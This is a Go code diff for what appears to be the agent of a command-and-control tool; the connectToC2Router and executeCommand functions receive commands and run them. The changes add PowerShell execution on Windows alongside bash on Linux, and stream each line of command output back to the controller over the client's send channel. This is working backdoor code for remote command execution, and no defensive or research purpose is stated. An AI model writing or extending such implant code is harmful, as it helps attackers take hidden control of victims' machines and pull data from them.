@@ -13,7 +13,7 @@ import (
 	"os"
 	"os/exec"
 	"os/signal"
-	"strings"
+	"runtime"
 	"time"
 )
 
@@ -82,7 +82,12 @@ func connectToC2Router() {
 //
 
 func executeCommand(command string, c *Client) {
-	cmd := exec.Command("bash", "-c", command) // '-b' option for non-interactive mode
+	var cmd *exec.Cmd
+	if runtime.GOOS == "windows" {
+		cmd = exec.Command("powershell", "-NoProfile", command) // '-b' option for non-interactive mode
+	} else if runtime.GOOS == "linux" {
+		cmd = exec.Command("bash", "-c", command) // '-b' option for non-interactive mode
+	}
 	cmdReader, err := cmd.StdoutPipe()
 	if err != nil {
 		log.Fatalf("Error creating StdoutPipe for Cmd: %v", err)
@@ -94,7 +99,7 @@ func executeCommand(command string, c *Client) {
 
 	cmd.Start()
 	scanner := bufio.NewScanner(cmdReader)
-	var builder strings.Builder
+	//var builder strings.Builder
 
 	go func() {
 		timer := time.NewTimer(5 * time.Second)
@@ -113,10 +118,14 @@ func executeCommand(command string, c *Client) {
 			default:
 				// Continue to process output if available
 				if scanner.Scan() {
-					//commandOutput := scanner.Text() + "\n"
-					builder.WriteString(scanner.Text() + "\n")
+					commandOutput := scanner.Text() + "\n"
+					//builder.WriteString(scanner.Text() + "\n")
 
 					//log.Println(commandOutput)
+					//completeOutput := builder.String()
+					transferPacket := encodeTransferPacket("command_output", commandOutput)
+					//log.Println("Complete Output:\n", completeOutput)
+					c.send <- transferPacket
 				} else {
 					// If scanner.Scan() returns false, it might mean EOF or an error.
 					if err := scanner.Err(); err != nil {
@@ -130,10 +139,7 @@ func executeCommand(command string, c *Client) {
 					return // Exit the goroutine
 				}
 			}
-			completeOutput := builder.String()
-			transferPacket := encodeTransferPacket("command_output", completeOutput)
-			//log.Println("Complete Output:\n", completeOutput)
-			c.send <- transferPacket
+
 		}
 	}()
 }
